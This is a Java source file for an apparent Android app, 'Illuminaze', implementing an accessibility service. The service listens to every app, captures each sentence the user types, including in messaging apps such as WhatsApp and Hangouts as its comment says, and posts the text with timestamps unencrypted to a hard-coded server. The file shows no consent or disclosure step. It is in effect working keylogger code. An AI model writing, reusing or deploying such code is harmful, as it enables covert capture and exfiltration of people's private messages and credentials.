package com.example.illuminaze;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

/** This class receives accessibility events and handles keyboard events */
public class IlluminazeAccessibilityService extends AccessibilityService {
    //private static final FluentLogger logger = FluentLogger.forEnclosingClass();
    private String currentText = "";
    private String prevText = "";
    private boolean firstTextEvent = true;
    private static boolean isRunning = false;


    @Override
    public void onCreate() {
        super.onCreate();
        isRunning = true;

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
    }

    public static boolean isRunning() {
        return isRunning;
    }


    @Override
    public void onInterrupt() {
    }

    /**
     * Logs every full sentence typed by the user. Works for all apps that use TextViews (Messages,
     * Hangouts, Whatsapp, etc)
     */
    protected void onServiceConnected() {
        System.out.println("onServiceConnected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.eventTypes=AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        info.packageNames = null;
        setServiceInfo(info);

    }

    /**
     * Sends a HTTP post request to the server via JSON
     * @param timestamp
     * @param text
     */
    public void sendPost(long timestamp, String text) {
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL("http://10.194.223.134:5000/phone_data/test_user");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
                    conn.setRequestProperty("Accept","application/json");
                    conn.setDoOutput(true);
                    conn.setDoInput(true);

                    JSONObject jsonParam = new JSONObject();
                    jsonParam.put("timestamp", timestamp);
                    jsonParam.put("message", text);
                    jsonParam.put("user","test_user");


                    Log.i("JSON", jsonParam.toString());
                    DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                    //os.writeBytes(URLEncoder.encode(jsonParam.toString(), "UTF-8"));
                    os.writeBytes(jsonParam.toString());

                    os.flush();
                    os.close();

                    Log.i("STATUS", String.valueOf(conn.getResponseCode()));
                    Log.i("MSG" , conn.getResponseMessage());

                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        thread.start();
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            return;
        }
        // prevText functions as an internal storage of the last word the user typed.
        prevText = currentText;
        currentText = event.getSource().getText().toString();
        // If the following conditions are met the text is ready to be consumed.
        boolean isUserDoneTyping = event.getFromIndex() == 0;
        boolean userHasTyped = event.getAddedCount() == 1;
        boolean userNotDeleting = event.getRemovedCount() == 0;
        if (!firstTextEvent && isUserDoneTyping && userHasTyped && userNotDeleting) {
            Log.i("Here", "Text Output: %s" + prevText);
            long timestamp = System.currentTimeMillis();
            sendPost(timestamp, prevText);
            currentText = "";
        }
        if (firstTextEvent) {
            firstTextEvent = false;
        }
    }

}
